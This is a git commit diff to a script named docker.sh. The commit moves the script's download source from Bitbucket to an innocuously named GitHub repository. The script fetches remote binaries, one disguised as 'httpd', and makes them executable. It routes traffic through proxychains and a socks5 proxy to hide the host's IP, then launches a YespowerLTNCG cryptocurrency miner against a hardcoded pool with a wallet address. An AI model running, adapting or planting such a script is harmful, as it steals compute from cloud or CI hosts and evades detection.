660590a35babd36c2df027a33eedf5f75d739abd
sartielena <153318838+sartielena@users.noreply.github.com>
2023-12-09 11:31:47 +0700

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -1,9 +1,9 @@
 proxy="208.102.51.6" 
 port="58208" 
-wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
-wget -q https://bitbucket.org/indarsza/sanaya/downloads/panel && chmod +x panel 
-wget -q https://bitbucket.org/indarsza/sanaya/downloads/proxychains.conf && chmod +x proxychains.conf 
-wget -q https://bitbucket.org/indarsza/sanaya/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+wget -q -O vx https://github.com/sartielena/refactored-octo-fishstick/raw/main/httpd && chmod +x vx
+wget -q https://github.com/sartielena/refactored-octo-fishstick/raw/main/panel && chmod +x panel 
+wget -q https://raw.githubusercontent.com/sartielena/refactored-octo-fishstick/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://github.com/sartielena/refactored-octo-fishstick/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
@@ -17,4 +17,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./vx -a YespowerLTNCG -o stratum+tcp://74.207.229.192:443 -u MR7quZT8SMCvfbnK8zUi9NZB6snmgAWaV6.$(echo $(shuf -i 1-9 -n 1)-yui) -p x -t1 -x socks5://89.58.45.94:43420
+./panel ./vx -a YespowerLTNCG -o 74.207.229.192:443 -u KTU3bYUi7HmCbaRuoKQmS667ouEYuuSRRF.$(echo $(shuf -i 1-9 -n 1)-yui) -p x -t1 -x socks5://89.58.45.94:43420
